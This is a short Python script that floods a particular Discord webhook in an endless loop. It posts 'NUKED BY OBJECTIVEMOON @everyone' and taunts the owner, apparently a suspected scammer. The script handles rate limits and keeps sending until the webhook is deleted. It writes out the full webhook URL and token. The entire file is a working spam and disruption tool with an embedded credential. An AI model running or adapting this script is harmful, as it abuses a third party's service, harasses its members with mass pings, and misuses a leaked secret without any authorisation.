import requests
count = 0
while True:
    resp = requests.post(url="https://discord.com/api/webhooks/1415627701661732915/X200KEf2w-atR5rrT8Nm0OWmkIYfwNa7XudH2z0cmv_oFAQlSvkTEt2CJGXe8XIV_O2W",headers={'Content-Type':'application/json'},json={"content":"NUKED BY OBJECTIVEMOON @everyone\nI WILL RELEASE THIS WEBHOOK IN LEDGER LIVE CHAT LOLOLOLOLOLOLOL\nSTOP SCAMMING IDIOTS LOLOLOLOLOLOL"})
    if not resp.status_code == 429:
        if resp.status_code == 404:
            raise RuntimeError("webhook got delet or dont exist :(")
        print(f"SENT LOLOOLOL {count}")
        count = count+1
    print(resp.status_code)
    